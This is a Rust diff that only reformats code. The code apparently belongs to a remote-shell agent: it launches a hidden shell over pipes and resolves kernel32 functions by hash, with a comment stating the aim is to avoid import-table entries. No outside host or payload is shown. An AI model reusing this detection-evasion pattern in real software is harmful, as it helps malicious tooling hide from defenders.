@@ -394,9 +394,9 @@ fn default_shell() -> &'static str {
 fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPipes), String> {
     use crate::win_types::{DWORD, TRUE};
 
+    use crate::win_types::HANDLE;
     use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
     use windows_sys::Win32::System::Threading::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES};
-    use crate::win_types::HANDLE;
 
     // Dynamically resolve kernel32 functions to avoid IAT entries.
     let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
@@ -407,10 +407,10 @@ fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPip
         unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreatePipe\0")) }
             .ok_or_else(|| "could not resolve CreatePipe".to_string())?;
     type CreatePipeFn = unsafe extern "system" fn(
-        *mut crate::win_types::HANDLE,               // hReadPipe
-        *mut crate::win_types::HANDLE,               // hWritePipe
+        *mut crate::win_types::HANDLE,              // hReadPipe
+        *mut crate::win_types::HANDLE,              // hWritePipe
         *mut crate::win_types::SECURITY_ATTRIBUTES, // lpPipeAttributes
-        DWORD,                                            // nSize
+        DWORD,                                      // nSize
     ) -> i32; // BOOL
     let create_pipe: CreatePipeFn = unsafe { std::mem::transmute(create_pipe_addr) };
 
@@ -716,10 +716,10 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
             .ok_or_else(|| "could not resolve WriteFile".to_string())?;
     type WriteFileFn = unsafe extern "system" fn(
         crate::win_types::HANDLE, // hFile
-        *const c_void,                 // lpBuffer
-        u32,                           // nNumberOfBytesToWrite
-        *mut u32,                      // lpNumberOfBytesWritten
-        *mut c_void,                   // lpOverlapped
+        *const c_void,            // lpBuffer
+        u32,                      // nNumberOfBytesToWrite
+        *mut u32,                 // lpNumberOfBytesWritten
+        *mut c_void,              // lpOverlapped
     ) -> i32; // BOOL
     let write_file: WriteFileFn = unsafe { std::mem::transmute(write_file_addr) };
 
@@ -752,11 +752,11 @@ fn read_from_pipe(handle: crate::win_types::HANDLE) -> Option<Vec<u8>> {
     }?;
     type PeekNamedPipeFn = unsafe extern "system" fn(
         crate::win_types::HANDLE, // hNamedPipe
-        *mut c_void,                   // lpBuffer
-        u32,                           // nBufferSize
-        *mut u32,                      // lpBytesRead
-        *mut u32,                      // lpTotalBytesAvail
-        *mut u32,                      // lpBytesLeftThisMessage
+        *mut c_void,              // lpBuffer
+        u32,                      // nBufferSize
+        *mut u32,                 // lpBytesRead
+        *mut u32,                 // lpTotalBytesAvail
+        *mut u32,                 // lpBytesLeftThisMessage
     ) -> i32; // BOOL
     let peek_named_pipe: PeekNamedPipeFn = unsafe { std::mem::transmute(peek_named_pipe_addr) };
 
@@ -764,10 +764,10 @@ fn read_from_pipe(handle: crate::win_types::HANDLE) -> Option<Vec<u8>> {
         unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"ReadFile\0")) }?;
     type ReadFileFn = unsafe extern "system" fn(
         crate::win_types::HANDLE, // hFile
-        *mut c_void,                   // lpBuffer
-        u32,                           // nNumberOfBytesToRead
-        *mut u32,                      // lpNumberOfBytesRead
-        *mut c_void,                   // lpOverlapped
+        *mut c_void,              // lpBuffer
+        u32,                      // nNumberOfBytesToRead
+        *mut u32,                 // lpNumberOfBytesRead
+        *mut c_void,              // lpOverlapped
     ) -> i32; // BOOL
     let read_file: ReadFileFn = unsafe { std::mem::transmute(read_file_addr) };
 
@@ -1158,8 +1158,7 @@ fn spawn_readers(
                     // Read from stderr (Windows only — PTY merges into master_fd on Unix).
                     #[cfg(windows)]
                     {
-                        let stderr_data =
-                            read_from_pipe(stderr_handle as crate::win_types::HANDLE);
+                        let stderr_data = read_from_pipe(stderr_handle as crate::win_types::HANDLE);
 
                         if let Some(data) = stderr_data {
                             let text = String::from_utf8_lossy(&data).to_string();
